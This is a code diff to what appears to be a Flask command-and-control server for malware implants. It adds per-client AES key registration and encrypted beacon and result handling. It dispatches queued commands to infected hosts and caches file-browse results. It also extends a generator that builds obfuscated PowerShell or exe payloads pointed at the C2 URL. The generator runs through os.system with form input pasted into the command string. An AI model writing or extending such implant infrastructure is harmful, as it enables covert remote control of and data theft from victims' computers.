@@ -14,7 +14,9 @@ from datetime import datetime, UTC
 import platform
 import shutil
 
+from collections import defaultdict
 
+aes_keys_by_client_id = {}
 
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'tools')))
 from ps_builder import generate_obfuscated_ps
@@ -233,20 +235,60 @@ def console_output():
     output = "\n\n".join([f"$ {cmd}\n{res}" for cmd, res in rows]) or "[+] No output yet..."
     return output
 
+@app.route("/register", methods=["POST"])
+def register_aes_key():
+    data = request.get_json()
+    client_id = data.get("client_id")
+    aes_key_b64 = data.get("aes_key")
+
+    if not client_id or not aes_key_b64:
+        return "Missing client_id or aes_key", 400
+
+    try:
+        aes_keys_by_client_id[client_id] = base64.b64decode(aes_key_b64)
+        print(f"[+] Registered AES key for client: {client_id}")
+        return "OK", 200
+    except Exception as e:
+        print(f"[!] Failed to register AES key: {e}")
+        return "Error", 500
+
+
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted = request.data.decode()
-    data = json.loads(aes_decrypt(encrypted))
+
+    from utils.crypto import aes_decrypt  # ensure you import the right one
+    data = None
+    client_id_match = None
+
+    for client_id, aes_key in aes_keys_by_client_id.items():
+        try:
+            decrypted = aes_decrypt(encrypted, aes_key)
+            parsed = json.loads(decrypted)
+
+            # Check if the decrypted data contains the correct client_id
+            if parsed.get("client_id") == client_id:
+                data = parsed
+                client_id_match = client_id
+                break
+        except Exception:
+            continue
+
+    if not data:
+        print("[!] Failed to decrypt beacon with any known AES key.")
+        return "Decryption failed", 403
+
     ip = request.remote_addr
     hostname = data.get('hostname', 'unknown')
     payload = data.get('payload', 'none')
     timestamp = datetime.now(UTC).isoformat()
 
-    print(f"[+] Beacon received from {hostname} ({ip}) - Payload: {payload}")
+    print(f"[+] Beacon received from {client_id_match} ({hostname}) - {ip} - Payload: {payload}")
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)", (ip, hostname, timestamp, payload))
+    c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)",
+            (ip, hostname, timestamp, payload))
     c.execute("SELECT id, command FROM tasks WHERE hostname = ? AND status = 'pending'", (hostname,))
     tasks = c.fetchall()
     c.execute("UPDATE tasks SET status = 'dispatched' WHERE hostname = ? AND status = 'pending'", (hostname,))
@@ -256,15 +298,28 @@ def beacon():
     commands = [cmd for _, cmd in tasks]
     return jsonify({'tasks': commands}), 200
 
+
 @app.route('/result', methods=['POST'])
 def result():
     encrypted = request.data.decode()
-    data = json.loads(aes_decrypt(encrypted))
+
+    # Use registered AES keys to try decrypting
+    data = None
+    for client_id, key in aes_keys_by_client_id.items():
+        try:
+            data = json.loads(aes_decrypt(encrypted, key))
+            break
+        except Exception:
+            continue
+
+    if data is None:
+        print("[!] Failed to decrypt result with any known AES key.")
+        return jsonify({"error": "Unable to decrypt result"}), 400
+
     hostname = data.get("hostname")
     command = data.get("command")
     result = data.get("result")
-    #small change 
-    # If result is a dict (e.g., from scan task), stringify it for storage/logging
+
     if isinstance(result, dict):
         result = json.dumps(result, indent=2)
 
@@ -292,7 +347,6 @@ def result():
             if command.startswith("browse "):
                 browse_cmd = True
             else:
-            # Try to parse JSON
                 try:
                     cmd_obj = json.loads(command)
                     if isinstance(cmd_obj, dict) and cmd_obj.get("action") == "browse":
@@ -300,17 +354,15 @@ def result():
                 except Exception:
                     pass
         if browse_cmd:
-        # result is JSON string (from agent)
             try:
                 browse_json = json.loads(result)
-                browse_results[hostname] = browse_json  # Cache for quick access
+                browse_results[hostname] = browse_json
                 print(f"[DEBUG] Cached browse result for {hostname}: {browse_json}")
             except Exception as ex:
                 print(f"[!] Failed to parse browse result: {ex}")
     except Exception as ex:
         print(f"[!] Error in browse result handler: {ex}")
 
-    # Store result in database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute(
@@ -320,7 +372,6 @@ def result():
     conn.commit()
     conn.close()
 
-    # Emit result to live console view
     socketio.emit("console_result", {
         "hostname": hostname,
         "command": command,
@@ -345,12 +396,18 @@ def generate():
 
         os.makedirs(os.path.dirname(out_path), exist_ok=True)
 
-        # Start building the command
+        # AES key (optional input)
+        aes_key_b64 = request.form.get('aes_key')
+        if not aes_key_b64:
+            aes_key = os.urandom(32)
+            aes_key_b64 = base64.b64encode(aes_key).decode()
+        else:
+            aes_key_b64 = aes_key_b64.strip()
+
+        # Build generator command
         GENERATOR_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "../tools/generate_payload.py"))
-        cmd = f"python3 {GENERATOR_PATH} --c2 {c2url} --result {resulturl} --output {out_path}"
+        cmd = f"python3 {GENERATOR_PATH} --c2 {c2url} --result {resulturl} --output {out_path} --aes {aes_key_b64}"
 
-
-        # Optional flags
         if ext == 'exe':
             cmd += " --exe"
         if 'obfuscate' in request.form:
@@ -363,7 +420,7 @@ def generate():
         print(f"[+] Running: {cmd}")
         os.system(cmd)
 
-        return redirect(url_for('download_payload', filename=full_filename))
+        return render_template("generate.html", output_path=full_filename, aes_key_used=aes_key_b64)
 
     return render_template("generate.html")
 
